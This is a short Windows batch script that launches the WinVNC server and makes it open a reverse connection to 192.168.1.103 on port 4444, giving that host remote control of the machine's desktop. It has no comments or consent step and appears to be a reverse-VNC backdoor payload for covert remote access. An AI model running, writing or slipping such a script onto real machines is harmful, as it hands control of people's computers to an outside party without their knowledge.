@echo off 
winvnc.exe -run
start timeout /t 1 >nul
start winvnc.exe -connect 192.168.1.103::4444